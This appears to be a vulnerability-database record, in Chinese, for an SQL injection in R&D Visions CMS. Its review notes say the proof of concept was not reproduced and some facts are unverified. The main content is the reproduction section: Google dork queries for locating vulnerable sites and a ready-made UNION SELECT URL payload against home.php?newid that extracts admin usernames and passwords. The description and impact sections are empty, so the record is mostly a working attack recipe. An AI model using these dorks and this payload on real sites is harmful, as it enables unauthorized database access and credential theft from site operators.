---
source: "hatch 补库批 20260928"
product: "R&D Visions CMS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "R&D Visions CMS  SQL Injection"
prerequisites: "来源所述条件，未列明部分仍待核：home.php newid数值拼接、12列及admin_user_log表结构、数据库兼容MySQL"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-8bcaf7ab45e582edd09accbe"
entity_id: "ve-8bcaf7ab45e582edd09accbe"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：home.php newid数值拼接、12列及admin_user_log表结构、数据库兼容MySQL

- **事实待核（1）**：无版本/源码/响应/出处；搜索newid例子与dork id不同仅线索。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：尾--缺必要空白在某些MySQL配置无效；不能据裸UNION认定普遍可用。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（3）**：password字段是否哈希未知，提取数据敏感性应准确。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# R&D Visions CMS SQL Injection

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

Google Dork:

    intext:"Website by R&D Visions" inurl:.php?id=

    intext:"CMS System by R&D Visions"

Demo:

    https://www.0-sec.org/home.php?newid=53[SQLi]

Injection:

    https://www.0-sec.org/home.php?newid=-53+Union+Select+1,Group_ConCat(user,0x3a,pass),3,4,5,6,7,8,9,10,11,12+From+admin_user_log--
